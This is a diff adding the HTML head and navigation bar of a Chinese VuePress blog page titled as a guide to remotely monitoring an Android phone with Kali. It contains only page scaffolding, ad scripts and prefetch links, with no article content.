@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>kali远程监控安卓手机 | 匆匆趣玩</title>
+    <meta name="generator" content="VuePress 1.9.10">
+    <link rel="icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/css/katex.min.css">
+    <script async="true" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6542685716937885" crossorigin="anonymous"></script>
+    <script async="true" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <meta name="description" content="分享各类资源、教程、黑科技软件、工具等等">
+    <meta http_equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <meta name="baidu-site-verification" content="codeva-7KiW1mSNFG">
+    <meta name="google-adsense-account" content="ca-pub-6542685716937885">
+    
+    <link rel="preload" href="/assets/css/0.styles.3520924c.css" as="style"><link rel="preload" href="/assets/js/app.97fe8595.js" as="script"><link rel="preload" href="/assets/js/2.fefabc39.js" as="script"><link rel="preload" href="/assets/js/1.462a7e3a.js" as="script"><link rel="preload" href="/assets/js/218.9fa572e9.js" as="script"><link rel="prefetch" href="/assets/js/10.0418c56c.js"><link rel="prefetch" href="/assets/js/100.1afc5ae0.js"><link rel="prefetch" href="/assets/js/101.0a66a4ce.js"><link rel="prefetch" href="/assets/js/102.4798666f.js"><link rel="prefetch" href="/assets/js/103.1dafac8a.js"><link rel="prefetch" href="/assets/js/104.4021863c.js"><link rel="prefetch" href="/assets/js/105.ebec4df6.js"><link rel="prefetch" href="/assets/js/106.2b6dd083.js"><link rel="prefetch" href="/assets/js/107.ad6bab4a.js"><link rel="prefetch" href="/assets/js/108.ea5d11c5.js"><link rel="prefetch" href="/assets/js/109.ec1d6922.js"><link rel="prefetch" href="/assets/js/11.b157d3ae.js"><link rel="prefetch" href="/assets/js/110.06427493.js"><link rel="prefetch" href="/assets/js/111.8385e47f.js"><link rel="prefetch" href="/assets/js/112.b49c8183.js"><link rel="prefetch" href="/assets/js/113.4e96546f.js"><link rel="prefetch" href="/assets/js/114.e0c71466.js"><link rel="prefetch" href="/assets/js/115.d9158777.js"><link rel="prefetch" href="/assets/js/116.3b14fdf0.js"><link rel="prefetch" href="/assets/js/117.bee31071.js"><link rel="prefetch" href="/assets/js/118.0890a357.js"><link rel="prefetch" href="/assets/js/119.273c5e0c.js"><link rel="prefetch" href="/assets/js/12.4e73e991.js"><link rel="prefetch" href="/assets/js/120.3e04a361.js"><link rel="prefetch" href="/assets/js/121.a72137fc.js"><link rel="prefetch" href="/assets/js/122.34456180.js"><link rel="prefetch" href="/assets/js/123.08305f05.js"><link rel="prefetch" href="/assets/js/124.5a1cd7db.js"><link rel="prefetch" href="/assets/js/125.23bc1124.js"><link rel="prefetch" href="/assets/js/126.be29c8f3.js"><link rel="prefetch" href="/assets/js/127.45446954.js"><link rel="prefetch" href="/assets/js/128.662e6efd.js"><link rel="prefetch" href="/assets/js/129.391dbf30.js"><link rel="prefetch" href="/assets/js/13.3d0c690b.js"><link rel="prefetch" href="/assets/js/130.6ac81472.js"><link rel="prefetch" href="/assets/js/131.95c4f30f.js"><link rel="prefetch" href="/assets/js/132.5475851d.js"><link rel="prefetch" href="/assets/js/133.e90e7a3e.js"><link rel="prefetch" href="/assets/js/134.c5996955.js"><link rel="prefetch" href="/assets/js/135.22598c8e.js"><link rel="prefetch" href="/assets/js/136.6fd32c30.js"><link rel="prefetch" href="/assets/js/137.d4cc8caf.js"><link rel="prefetch" href="/assets/js/138.b79c2a65.js"><link rel="prefetch" href="/assets/js/139.a8618cc3.js"><link rel="prefetch" href="/assets/js/14.aad4f568.js"><link rel="prefetch" href="/assets/js/140.55cf2437.js"><link rel="prefetch" href="/assets/js/141.242d37f1.js"><link rel="prefetch" href="/assets/js/142.7d7ea38a.js"><link rel="prefetch" href="/assets/js/143.2a4c7192.js"><link rel="prefetch" href="/assets/js/144.7759d3a3.js"><link rel="prefetch" href="/assets/js/145.c1ce2df5.js"><link rel="prefetch" href="/assets/js/146.6857ce13.js"><link rel="prefetch" href="/assets/js/147.23183a95.js"><link rel="prefetch" href="/assets/js/148.9da9655e.js"><link rel="prefetch" href="/assets/js/149.fa1d7fac.js"><link rel="prefetch" href="/assets/js/15.9bd2d29e.js"><link rel="prefetch" href="/assets/js/150.2e2f5f6d.js"><link rel="prefetch" href="/assets/js/151.4349fdb1.js"><link rel="prefetch" href="/assets/js/152.0c38b8bb.js"><link rel="prefetch" href="/assets/js/153.13686dd3.js"><link rel="prefetch" href="/assets/js/154.b4136600.js"><link rel="prefetch" href="/assets/js/155.9af3218b.js"><link rel="prefetch" href="/assets/js/156.26101b0a.js"><link rel="prefetch" href="/assets/js/157.79d416d8.js"><link rel="prefetch" href="/assets/js/158.8b9e09b0.js"><link rel="prefetch" href="/assets/js/159.986e17be.js"><link rel="prefetch" href="/assets/js/16.81fccd37.js"><link rel="prefetch" href="/assets/js/160.f4b931e8.js"><link rel="prefetch" href="/assets/js/161.3a4a9775.js"><link rel="prefetch" href="/assets/js/162.8821c7c0.js"><link rel="prefetch" href="/assets/js/163.b1e9281f.js"><link rel="prefetch" href="/assets/js/164.34655c73.js"><link rel="prefetch" href="/assets/js/165.bfc560cf.js"><link rel="prefetch" href="/assets/js/166.02ab3edb.js"><link rel="prefetch" href="/assets/js/167.93c27941.js"><link rel="prefetch" href="/assets/js/168.f5521c9d.js"><link rel="prefetch" href="/assets/js/169.3435836a.js"><link rel="prefetch" href="/assets/js/17.34ee5a1d.js"><link rel="prefetch" href="/assets/js/170.b97e52c7.js"><link rel="prefetch" href="/assets/js/171.f695e336.js"><link rel="prefetch" href="/assets/js/172.0a2f47e0.js"><link rel="prefetch" href="/assets/js/173.b73aea0e.js"><link rel="prefetch" href="/assets/js/174.51dd527b.js"><link rel="prefetch" href="/assets/js/175.fa725da0.js"><link rel="prefetch" href="/assets/js/176.e2b08dbe.js"><link rel="prefetch" href="/assets/js/177.e1c081ba.js"><link rel="prefetch" href="/assets/js/178.48563ee1.js"><link rel="prefetch" href="/assets/js/179.c378bc4e.js"><link rel="prefetch" href="/assets/js/18.11346518.js"><link rel="prefetch" href="/assets/js/180.a0567b05.js"><link rel="prefetch" href="/assets/js/181.501e5697.js"><link rel="prefetch" href="/assets/js/182.0335a0bb.js"><link rel="prefetch" href="/assets/js/183.563aa51f.js"><link rel="prefetch" href="/assets/js/184.60b8f12d.js"><link rel="prefetch" href="/assets/js/185.739d3efe.js"><link rel="prefetch" href="/assets/js/186.ae936618.js"><link rel="prefetch" href="/assets/js/187.98a749f4.js"><link rel="prefetch" href="/assets/js/188.3a2e64f8.js"><link rel="prefetch" href="/assets/js/189.7fa3da3c.js"><link rel="prefetch" href="/assets/js/19.d4e3902c.js"><link rel="prefetch" href="/assets/js/190.1750435a.js"><link rel="prefetch" href="/assets/js/191.68f183d4.js"><link rel="prefetch" href="/assets/js/192.5c265368.js"><link rel="prefetch" href="/assets/js/193.f0a9713c.js"><link rel="prefetch" href="/assets/js/194.cdcc1b37.js"><link rel="prefetch" href="/assets/js/195.f1385836.js"><link rel="prefetch" href="/assets/js/196.a6552dd4.js"><link rel="prefetch" href="/assets/js/197.49f38fe1.js"><link rel="prefetch" href="/assets/js/198.32f8c394.js"><link rel="prefetch" href="/assets/js/199.73914d2d.js"><link rel="prefetch" href="/assets/js/20.1fe0cb24.js"><link rel="prefetch" href="/assets/js/200.13daf70b.js"><link rel="prefetch" href="/assets/js/201.2cd177e4.js"><link rel="prefetch" href="/assets/js/202.663c67ac.js"><link rel="prefetch" href="/assets/js/203.e3fed5f5.js"><link rel="prefetch" href="/assets/js/204.e4932284.js"><link rel="prefetch" href="/assets/js/205.160c55bd.js"><link rel="prefetch" href="/assets/js/206.b366ffd5.js"><link rel="prefetch" href="/assets/js/207.46d4a6db.js"><link rel="prefetch" href="/assets/js/208.2282eee1.js"><link rel="prefetch" href="/assets/js/209.695a14b6.js"><link rel="prefetch" href="/assets/js/21.bab94508.js"><link rel="prefetch" href="/assets/js/210.6d4577d6.js"><link rel="prefetch" href="/assets/js/211.e82f01c4.js"><link rel="prefetch" href="/assets/js/212.666ce6af.js"><link rel="prefetch" href="/assets/js/213.67eb02fa.js"><link rel="prefetch" href="/assets/js/214.e0e5b355.js"><link rel="prefetch" href="/assets/js/215.1d31b64d.js"><link rel="prefetch" href="/assets/js/216.415a437d.js"><link rel="prefetch" href="/assets/js/217.ee87c94b.js"><link rel="prefetch" href="/assets/js/219.6f9d6c0b.js"><link rel="prefetch" href="/assets/js/22.b79d2b0f.js"><link rel="prefetch" href="/assets/js/220.ecaec5bc.js"><link rel="prefetch" href="/assets/js/221.66c69f12.js"><link rel="prefetch" href="/assets/js/222.85569e41.js"><link rel="prefetch" href="/assets/js/223.88bb292c.js"><link rel="prefetch" href="/assets/js/224.26d297af.js"><link rel="prefetch" href="/assets/js/225.839527f4.js"><link rel="prefetch" href="/assets/js/226.bd7fffac.js"><link rel="prefetch" href="/assets/js/227.60c49065.js"><link rel="prefetch" href="/assets/js/228.c1126f27.js"><link rel="prefetch" href="/assets/js/229.3b01a816.js"><link rel="prefetch" href="/assets/js/23.ae17c872.js"><link rel="prefetch" href="/assets/js/230.97add79d.js"><link rel="prefetch" href="/assets/js/231.d3e1d08c.js"><link rel="prefetch" href="/assets/js/232.4f3be69c.js"><link rel="prefetch" href="/assets/js/233.8ec6c01e.js"><link rel="prefetch" href="/assets/js/234.2658c58d.js"><link rel="prefetch" href="/assets/js/235.e980ab5c.js"><link rel="prefetch" href="/assets/js/236.a59b068b.js"><link rel="prefetch" href="/assets/js/237.79717b36.js"><link rel="prefetch" href="/assets/js/238.b17ebd30.js"><link rel="prefetch" href="/assets/js/239.e8f79d85.js"><link rel="prefetch" href="/assets/js/24.65b88b87.js"><link rel="prefetch" href="/assets/js/240.661c8fb1.js"><link rel="prefetch" href="/assets/js/241.cbd42ea8.js"><link rel="prefetch" href="/assets/js/242.47637ad7.js"><link rel="prefetch" href="/assets/js/243.6cd02c64.js"><link rel="prefetch" href="/assets/js/244.30d3aceb.js"><link rel="prefetch" href="/assets/js/245.1c32854e.js"><link rel="prefetch" href="/assets/js/246.b8ab0083.js"><link rel="prefetch" href="/assets/js/247.8eaeca30.js"><link rel="prefetch" href="/assets/js/248.494992aa.js"><link rel="prefetch" href="/assets/js/249.25a8f4cf.js"><link rel="prefetch" href="/assets/js/25.2087c52c.js"><link rel="prefetch" href="/assets/js/250.484759fb.js"><link rel="prefetch" href="/assets/js/251.99957cb8.js"><link rel="prefetch" href="/assets/js/252.e50c0984.js"><link rel="prefetch" href="/assets/js/253.4331f44d.js"><link rel="prefetch" href="/assets/js/254.9b1ef009.js"><link rel="prefetch" href="/assets/js/255.c72fad18.js"><link rel="prefetch" href="/assets/js/256.6d2bc00a.js"><link rel="prefetch" href="/assets/js/257.73a7b394.js"><link rel="prefetch" href="/assets/js/258.e6d87716.js"><link rel="prefetch" href="/assets/js/259.576f02fc.js"><link rel="prefetch" href="/assets/js/26.ccd19768.js"><link rel="prefetch" href="/assets/js/260.1ca79a4a.js"><link rel="prefetch" href="/assets/js/261.98208f30.js"><link rel="prefetch" href="/assets/js/262.ec462101.js"><link rel="prefetch" href="/assets/js/263.d04402b0.js"><link rel="prefetch" href="/assets/js/264.2b090aa7.js"><link rel="prefetch" href="/assets/js/265.a77e0940.js"><link rel="prefetch" href="/assets/js/266.b8c07254.js"><link rel="prefetch" href="/assets/js/267.2c2df768.js"><link rel="prefetch" href="/assets/js/268.1d1bc035.js"><link rel="prefetch" href="/assets/js/269.6da32aa4.js"><link rel="prefetch" href="/assets/js/27.e886a0a2.js"><link rel="prefetch" href="/assets/js/270.35cf1045.js"><link rel="prefetch" href="/assets/js/271.eb52b808.js"><link rel="prefetch" href="/assets/js/272.6679b926.js"><link rel="prefetch" href="/assets/js/273.2ba21e1e.js"><link rel="prefetch" href="/assets/js/274.b5e14e39.js"><link rel="prefetch" href="/assets/js/275.9f7b14d7.js"><link rel="prefetch" href="/assets/js/276.8a2fe1c6.js"><link rel="prefetch" href="/assets/js/277.39c015f4.js"><link rel="prefetch" href="/assets/js/278.cb6d4697.js"><link rel="prefetch" href="/assets/js/279.b4145cb3.js"><link rel="prefetch" href="/assets/js/28.1ab6ad25.js"><link rel="prefetch" href="/assets/js/280.27ea8de6.js"><link rel="prefetch" href="/assets/js/281.e7e666d8.js"><link rel="prefetch" href="/assets/js/282.828508db.js"><link rel="prefetch" href="/assets/js/283.46392877.js"><link rel="prefetch" href="/assets/js/284.2cece84f.js"><link rel="prefetch" href="/assets/js/285.9c7f7ae9.js"><link rel="prefetch" href="/assets/js/286.ee4b9f10.js"><link rel="prefetch" href="/assets/js/287.af3506c5.js"><link rel="prefetch" href="/assets/js/288.2d867dda.js"><link rel="prefetch" href="/assets/js/289.f8dd79ad.js"><link rel="prefetch" href="/assets/js/29.e5afe3dd.js"><link rel="prefetch" href="/assets/js/290.070ffadd.js"><link rel="prefetch" href="/assets/js/291.f90fe58b.js"><link rel="prefetch" href="/assets/js/292.074eea65.js"><link rel="prefetch" href="/assets/js/293.ade2b880.js"><link rel="prefetch" href="/assets/js/294.2f48a113.js"><link rel="prefetch" href="/assets/js/295.5515ef19.js"><link rel="prefetch" href="/assets/js/296.94f72373.js"><link rel="prefetch" href="/assets/js/297.8a540eb8.js"><link rel="prefetch" href="/assets/js/298.389a0f45.js"><link rel="prefetch" href="/assets/js/299.2a7a60d9.js"><link rel="prefetch" href="/assets/js/3.ebdb48ee.js"><link rel="prefetch" href="/assets/js/30.ff4fbcbb.js"><link rel="prefetch" href="/assets/js/300.b753bc85.js"><link rel="prefetch" href="/assets/js/301.3380d27b.js"><link rel="prefetch" href="/assets/js/302.18ed1bf6.js"><link rel="prefetch" href="/assets/js/303.aa96cabc.js"><link rel="prefetch" href="/assets/js/304.c536070d.js"><link rel="prefetch" href="/assets/js/305.e40d7e03.js"><link rel="prefetch" href="/assets/js/306.54129188.js"><link rel="prefetch" href="/assets/js/307.513a800e.js"><link rel="prefetch" href="/assets/js/308.0dacaa08.js"><link rel="prefetch" href="/assets/js/309.afcdadca.js"><link rel="prefetch" href="/assets/js/31.cb71bc42.js"><link rel="prefetch" href="/assets/js/310.eac8160f.js"><link rel="prefetch" href="/assets/js/311.77ae8647.js"><link rel="prefetch" href="/assets/js/312.0358b4c6.js"><link rel="prefetch" href="/assets/js/313.834b148e.js"><link rel="prefetch" href="/assets/js/314.0dbeaa26.js"><link rel="prefetch" href="/assets/js/315.04741bde.js"><link rel="prefetch" href="/assets/js/316.fb19f321.js"><link rel="prefetch" href="/assets/js/317.9fa59d3c.js"><link rel="prefetch" href="/assets/js/318.b7d884fe.js"><link rel="prefetch" href="/assets/js/319.2ffb3ea0.js"><link rel="prefetch" href="/assets/js/32.c23e3b4a.js"><link rel="prefetch" href="/assets/js/320.1c2a846f.js"><link rel="prefetch" href="/assets/js/321.62c03f4e.js"><link rel="prefetch" href="/assets/js/322.bed8570f.js"><link rel="prefetch" href="/assets/js/323.46595c07.js"><link rel="prefetch" href="/assets/js/324.b9701833.js"><link rel="prefetch" href="/assets/js/325.6feb5980.js"><link rel="prefetch" href="/assets/js/326.5e39fe61.js"><link rel="prefetch" href="/assets/js/327.de380b46.js"><link rel="prefetch" href="/assets/js/328.5f699755.js"><link rel="prefetch" href="/assets/js/329.28f2228b.js"><link rel="prefetch" href="/assets/js/33.25f2d77b.js"><link rel="prefetch" href="/assets/js/330.82ef8bb9.js"><link rel="prefetch" href="/assets/js/331.c638d2a2.js"><link rel="prefetch" href="/assets/js/332.e140b077.js"><link rel="prefetch" href="/assets/js/333.34f31ac4.js"><link rel="prefetch" href="/assets/js/334.34cd247a.js"><link rel="prefetch" href="/assets/js/335.0cdb194b.js"><link rel="prefetch" href="/assets/js/336.171ebe28.js"><link rel="prefetch" href="/assets/js/337.9f4a02dd.js"><link rel="prefetch" href="/assets/js/338.052a201e.js"><link rel="prefetch" href="/assets/js/339.3ca1aed4.js"><link rel="prefetch" href="/assets/js/34.bbfb27f7.js"><link rel="prefetch" href="/assets/js/340.e960bf9b.js"><link rel="prefetch" href="/assets/js/341.e53e621a.js"><link rel="prefetch" href="/assets/js/342.a22a831a.js"><link rel="prefetch" href="/assets/js/343.a2db4973.js"><link rel="prefetch" href="/assets/js/344.2b4073e4.js"><link rel="prefetch" href="/assets/js/345.fa6f85a6.js"><link rel="prefetch" href="/assets/js/346.91e5577a.js"><link rel="prefetch" href="/assets/js/347.112e0080.js"><link rel="prefetch" href="/assets/js/348.b6406079.js"><link rel="prefetch" href="/assets/js/349.f49bbf7f.js"><link rel="prefetch" href="/assets/js/35.bcf79e87.js"><link rel="prefetch" href="/assets/js/350.cb5b553b.js"><link rel="prefetch" href="/assets/js/351.b11cdfe4.js"><link rel="prefetch" href="/assets/js/352.75f9a319.js"><link rel="prefetch" href="/assets/js/353.6bcd5c5c.js"><link rel="prefetch" href="/assets/js/354.3bf7f677.js"><link rel="prefetch" href="/assets/js/355.1ca0ff57.js"><link rel="prefetch" href="/assets/js/356.2fda02c8.js"><link rel="prefetch" href="/assets/js/357.69282c1e.js"><link rel="prefetch" href="/assets/js/358.eae28fb0.js"><link rel="prefetch" href="/assets/js/359.b76e2fa0.js"><link rel="prefetch" href="/assets/js/36.c897e545.js"><link rel="prefetch" href="/assets/js/360.bbc8f2c1.js"><link rel="prefetch" href="/assets/js/361.a5d2eb14.js"><link rel="prefetch" href="/assets/js/362.0431f397.js"><link rel="prefetch" href="/assets/js/363.dbde4032.js"><link rel="prefetch" href="/assets/js/364.0ce70043.js"><link rel="prefetch" href="/assets/js/365.5fb7b957.js"><link rel="prefetch" href="/assets/js/366.e9ea0a59.js"><link rel="prefetch" href="/assets/js/367.44fc8001.js"><link rel="prefetch" href="/assets/js/368.d99cc50b.js"><link rel="prefetch" href="/assets/js/369.b4bf52eb.js"><link rel="prefetch" href="/assets/js/37.b9f4949a.js"><link rel="prefetch" href="/assets/js/370.bb53ea97.js"><link rel="prefetch" href="/assets/js/371.96a06233.js"><link rel="prefetch" href="/assets/js/372.65f2fc44.js"><link rel="prefetch" href="/assets/js/373.74a06610.js"><link rel="prefetch" href="/assets/js/374.fa746e00.js"><link rel="prefetch" href="/assets/js/375.03365081.js"><link rel="prefetch" href="/assets/js/376.e5ae2179.js"><link rel="prefetch" href="/assets/js/377.331132be.js"><link rel="prefetch" href="/assets/js/378.274c43bc.js"><link rel="prefetch" href="/assets/js/379.8e02f30a.js"><link rel="prefetch" href="/assets/js/38.c6050021.js"><link rel="prefetch" href="/assets/js/380.6f6c4fdc.js"><link rel="prefetch" href="/assets/js/381.e2821d78.js"><link rel="prefetch" href="/assets/js/382.937ece56.js"><link rel="prefetch" href="/assets/js/383.b9c99de3.js"><link rel="prefetch" href="/assets/js/384.d2cb9b26.js"><link rel="prefetch" href="/assets/js/385.a5f57c8d.js"><link rel="prefetch" href="/assets/js/386.e8043e7b.js"><link rel="prefetch" href="/assets/js/387.a0cfe54e.js"><link rel="prefetch" href="/assets/js/388.3e031701.js"><link rel="prefetch" href="/assets/js/389.8e37ca49.js"><link rel="prefetch" href="/assets/js/39.8cc71f3d.js"><link rel="prefetch" href="/assets/js/390.8eb40196.js"><link rel="prefetch" href="/assets/js/391.ea0d393a.js"><link rel="prefetch" href="/assets/js/392.18fe47db.js"><link rel="prefetch" href="/assets/js/393.505ef4c4.js"><link rel="prefetch" href="/assets/js/394.69a647ed.js"><link rel="prefetch" href="/assets/js/395.c772ad1f.js"><link rel="prefetch" href="/assets/js/396.b2f024b3.js"><link rel="prefetch" href="/assets/js/397.21416483.js"><link rel="prefetch" href="/assets/js/398.fdf8d9ac.js"><link rel="prefetch" href="/assets/js/399.9502d3d3.js"><link rel="prefetch" href="/assets/js/4.e88de7d1.js"><link rel="prefetch" href="/assets/js/40.68cb82b3.js"><link rel="prefetch" href="/assets/js/400.00a05762.js"><link rel="prefetch" href="/assets/js/401.3608f54a.js"><link rel="prefetch" href="/assets/js/402.6bed4cdd.js"><link rel="prefetch" href="/assets/js/403.2a758881.js"><link rel="prefetch" href="/assets/js/404.1a888486.js"><link rel="prefetch" href="/assets/js/405.1de05595.js"><link rel="prefetch" href="/assets/js/406.1e9fafae.js"><link rel="prefetch" href="/assets/js/407.cc0be74f.js"><link rel="prefetch" href="/assets/js/408.ffa270bf.js"><link rel="prefetch" href="/assets/js/409.a96401ab.js"><link rel="prefetch" href="/assets/js/41.0a1975a5.js"><link rel="prefetch" href="/assets/js/410.9bfe3934.js"><link rel="prefetch" href="/assets/js/411.03a13972.js"><link rel="prefetch" href="/assets/js/412.0afc1c55.js"><link rel="prefetch" href="/assets/js/413.eb3a871f.js"><link rel="prefetch" href="/assets/js/414.2f4f806b.js"><link rel="prefetch" href="/assets/js/415.21b0faf6.js"><link rel="prefetch" href="/assets/js/416.5955eb26.js"><link rel="prefetch" href="/assets/js/417.cbc6577d.js"><link rel="prefetch" href="/assets/js/418.34195704.js"><link rel="prefetch" href="/assets/js/419.3b59a5a8.js"><link rel="prefetch" href="/assets/js/42.854eda3e.js"><link rel="prefetch" href="/assets/js/420.8b3b00bd.js"><link rel="prefetch" href="/assets/js/421.5aa58a00.js"><link rel="prefetch" href="/assets/js/422.495a1612.js"><link rel="prefetch" href="/assets/js/423.5d2ab088.js"><link rel="prefetch" href="/assets/js/424.ded191c6.js"><link rel="prefetch" href="/assets/js/425.7015e65c.js"><link rel="prefetch" href="/assets/js/426.d4982cdd.js"><link rel="prefetch" href="/assets/js/427.3b39dbb6.js"><link rel="prefetch" href="/assets/js/428.9e39d234.js"><link rel="prefetch" href="/assets/js/429.d210007e.js"><link rel="prefetch" href="/assets/js/43.4262473f.js"><link rel="prefetch" href="/assets/js/430.c2244a43.js"><link rel="prefetch" href="/assets/js/431.a472de09.js"><link rel="prefetch" href="/assets/js/432.143fcfce.js"><link rel="prefetch" href="/assets/js/433.6451048a.js"><link rel="prefetch" href="/assets/js/434.603b2aaf.js"><link rel="prefetch" href="/assets/js/435.ba1e1a95.js"><link rel="prefetch" href="/assets/js/436.457ecbae.js"><link rel="prefetch" href="/assets/js/437.6ce1ac95.js"><link rel="prefetch" href="/assets/js/438.30ac2b2f.js"><link rel="prefetch" href="/assets/js/439.5e8f829b.js"><link rel="prefetch" href="/assets/js/44.05ee20eb.js"><link rel="prefetch" href="/assets/js/440.cc921be0.js"><link rel="prefetch" href="/assets/js/441.b2d49272.js"><link rel="prefetch" href="/assets/js/442.680cfbbd.js"><link rel="prefetch" href="/assets/js/443.24819857.js"><link rel="prefetch" href="/assets/js/444.b52fd2f9.js"><link rel="prefetch" href="/assets/js/45.358f7c40.js"><link rel="prefetch" href="/assets/js/46.fc243b79.js"><link rel="prefetch" href="/assets/js/47.9688d03d.js"><link rel="prefetch" href="/assets/js/48.ea0d9717.js"><link rel="prefetch" href="/assets/js/49.a47c79ed.js"><link rel="prefetch" href="/assets/js/5.0b1c18f9.js"><link rel="prefetch" href="/assets/js/50.b3381ed1.js"><link rel="prefetch" href="/assets/js/51.65d9eb2d.js"><link rel="prefetch" href="/assets/js/52.ce86ed7c.js"><link rel="prefetch" href="/assets/js/53.296e42f0.js"><link rel="prefetch" href="/assets/js/54.0021adb4.js"><link rel="prefetch" href="/assets/js/55.24c20491.js"><link rel="prefetch" href="/assets/js/56.0ea64fbf.js"><link rel="prefetch" href="/assets/js/57.8a47ded2.js"><link rel="prefetch" href="/assets/js/58.2e2eff65.js"><link rel="prefetch" href="/assets/js/59.200e44fa.js"><link rel="prefetch" href="/assets/js/6.602cb5ec.js"><link rel="prefetch" href="/assets/js/60.699da42f.js"><link rel="prefetch" href="/assets/js/61.8f0908c4.js"><link rel="prefetch" href="/assets/js/62.cf4bd344.js"><link rel="prefetch" href="/assets/js/63.6537f21f.js"><link rel="prefetch" href="/assets/js/64.0f4fbaeb.js"><link rel="prefetch" href="/assets/js/65.8e273163.js"><link rel="prefetch" href="/assets/js/66.93ee3414.js"><link rel="prefetch" href="/assets/js/67.85777ef1.js"><link rel="prefetch" href="/assets/js/68.c10321c2.js"><link rel="prefetch" href="/assets/js/69.101d2410.js"><link rel="prefetch" href="/assets/js/7.8f53c354.js"><link rel="prefetch" href="/assets/js/70.970f4186.js"><link rel="prefetch" href="/assets/js/71.21c1f3a9.js"><link rel="prefetch" href="/assets/js/72.0f147409.js"><link rel="prefetch" href="/assets/js/73.e2c20b83.js"><link rel="prefetch" href="/assets/js/74.78c591c6.js"><link rel="prefetch" href="/assets/js/75.ab8b27e5.js"><link rel="prefetch" href="/assets/js/76.708e8f80.js"><link rel="prefetch" href="/assets/js/77.9a9bfa6f.js"><link rel="prefetch" href="/assets/js/78.d240b504.js"><link rel="prefetch" href="/assets/js/79.f9703f62.js"><link rel="prefetch" href="/assets/js/80.d98256db.js"><link rel="prefetch" href="/assets/js/81.f3711b8b.js"><link rel="prefetch" href="/assets/js/82.25e77bd3.js"><link rel="prefetch" href="/assets/js/83.2e22111b.js"><link rel="prefetch" href="/assets/js/84.ca35cd70.js"><link rel="prefetch" href="/assets/js/85.9d725198.js"><link rel="prefetch" href="/assets/js/86.d097d391.js"><link rel="prefetch" href="/assets/js/87.4a974e3d.js"><link rel="prefetch" href="/assets/js/88.cd16e965.js"><link rel="prefetch" href="/assets/js/89.23a56978.js"><link rel="prefetch" href="/assets/js/90.26abf092.js"><link rel="prefetch" href="/assets/js/91.4ef59449.js"><link rel="prefetch" href="/assets/js/92.345ef511.js"><link rel="prefetch" href="/assets/js/93.7766fd9e.js"><link rel="prefetch" href="/assets/js/94.57fc5290.js"><link rel="prefetch" href="/assets/js/95.363d695e.js"><link rel="prefetch" href="/assets/js/96.2efcc652.js"><link rel="prefetch" href="/assets/js/97.4a85dcf5.js"><link rel="prefetch" href="/assets/js/98.eb064c6c.js"><link rel="prefetch" href="/assets/js/99.a9d4edd5.js"><link rel="prefetch" href="/assets/js/vendors~docsearch.bf373595.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.3520924c.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="https://blog-1320192491.cos.ap-nanjing.myqcloud.com/logo.png" alt="匆匆趣玩" class="logo"> <span class="site-name can-hide">匆匆趣玩</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">
+  首页
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="图南博客" class="dropdown-title"><span class="title">图南博客</span> <span class="arrow down"></span></button> <button type="button" aria-label="图南博客" class="mobile-dropdown-title"><span class="title">图南博客</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://ground-gun.gitee.io/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Blog-first
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://wutunan.vercel.app/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Blog-second
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://gitee.com/ground-gun" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Gitee
